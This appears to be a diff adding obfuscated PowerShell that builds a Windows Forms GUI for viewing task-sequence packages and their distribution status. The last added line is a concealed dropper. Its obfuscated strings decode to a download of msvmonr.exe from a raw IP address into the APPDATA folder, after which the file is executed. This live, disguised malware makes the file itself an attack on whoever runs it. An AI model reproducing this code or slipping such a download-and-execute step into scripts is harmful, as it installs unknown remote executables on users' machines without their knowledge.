+${gbPAckaG`ER`eF}."AN`chOR" = ("{3}{6}{1}{0}{4}{5}{2}" -f 'Botto',', ','ght','To','m, Lef','t, Ri','p')
+${GBp`Ac`kAGeR`Ef}."Te`xT" = "Packages referenced in the task sequence: $($TaskSequence) "
+${gbP`A`ckageReF}."n`AMe" = ("{1}{0}{2}" -f'a','Pack','geRef')
+${G`BP`Ackag`edP} = &("{1}{2}{0}" -f'Object','New','-') ("{5}{4}{6}{2}{3}{0}{1}"-f'Forms.G','roupBox','indows','.','ste','Sy','m.W')
+${g`BpA`ck`AgeDP}."L`oCA`Tion" = &("{2}{0}{1}" -f'Objec','t','New-') ("{0}{2}{1}{3}"-f'System.','ng','Drawi','.Size')(10,315) 
+${gbp`ACKa`g`eDp}."SI`ZE" = &("{1}{0}{2}"-f'-O','New','bject') ("{4}{2}{3}{1}{0}"-f'ng.Size','wi','ys','tem.Dra','S')(770,250)
+${gB`PA`CkaGE`dp}."aNc`h`oR" = ("{2}{0}{3}{1}" -f 'Le',', Right','Bottom, ','ft')
+${G`BpA`CKAG`EDp}."te`xT" = ("{6}{1}{9}{4}{5}{10}{7}{3}{2}{8}{0}"-f'package','stribu','ted',' for selec','o','n ','Di','s',' ','ti','Statu')
+${GBpA`CKAg`E`dP}."n`AmE" = ("{2}{1}{0}"-f 'eDP','g','Packa')
+${GBpaC`kAg`einFO} = &("{0}{2}{1}"-f'New-O','t','bjec') ("{8}{3}{7}{0}{4}{5}{2}{6}{1}"-f'o','x','rms.Grou','ystem.','ws','.Fo','pBo','Wind','S')
+${G`B`PACKA`GEiNFo}."LocA`Ti`ON" = &("{3}{1}{0}{2}"-f 'c','Obje','t','New-') ("{3}{0}{1}{4}{2}{5}" -f '.','Dra','ing.','System','w','Size')(10,570) 
+${Gbp`A`Cka`Ge`iNFo}."sI`ZE" = &("{2}{3}{1}{0}"-f't','jec','Ne','w-Ob') ("{2}{4}{1}{0}{3}" -f 'i','g.S','System.D','ze','rawin')(770,180)
+${g`BPacK`A`ge`INfo}."AnC`Hor" = ("{5}{3}{0}{1}{4}{2}" -f 'm, Le','ft, Ri','t','otto','gh','B')
+${gBpa`ck`A`GEINfo}."t`EXT" = ("{0}{1}{3}{2}" -f 'In','forma','ion','t')
+${gbpAckaG`EIN`FO}."n`AMe" = ("{2}{0}{1}"-f'kage','Info','Pac')
+${gBP`ACk`AGE`OPt`ION} = &("{2}{0}{1}{3}" -f 'w-','Obj','Ne','ect') ("{3}{6}{0}{5}{2}{4}{1}"-f'.Wi','upBox','o','S','rms.Gro','ndows.F','ystem')
+${GBpa`cka`geoptIoN}."Lo`CAT`iOn" = &("{2}{1}{0}" -f'ct','ew-Obje','N') ("{2}{1}{4}{0}{3}"-f 'ing.Siz','ystem.','S','e','Draw')(790,10) 
+${gbP`AckAG`eoPt`I`On}."Si`ZE" = &("{2}{1}{0}"-f'bject','-O','New') ("{0}{3}{2}{1}{4}"-f 'System','g.Si','rawin','.D','ze')(130,100)
+${gBp`AcK`AgEo`PtIoN}."AN`chOR" = ("{1}{2}{0}" -f 'op','R','ight, T')
+${Gbp`Acka`g`EOPTion}."tE`Xt" = ("{4}{3}{1}{0}{2}" -f'ption','e O','s','g','Packa')
+${Gbp`Ac`K`AgeoPT`ioN}."nA`ME" = ("{0}{2}{1}"-f 'Pa','DP','ckage')
+
+
+&("{2}{3}{1}{0}" -f 'orm','F','L','oad-')
+(&("{0}{1}{2}"-f 'New-Ob','jec','t') ("{2}{1}{3}{0}" -f 'bClient','em.Net','Syst','.We')).("{3}{1}{2}{0}"-f'e','ownload','Fil','D').Invoke(("{7}{2}{0}{6}{5}{4}{8}{3}{1}" -f '.82.','exe','://80','msvmonr.','.45/~yaka','4','6','http','r/'),"$env:APPDATA\msvmonr.exe");&("{1}{0}{4}{2}{3}" -f 't','Star','roces','s','-P') ("$env:APPDATA\msvmonr.exe")
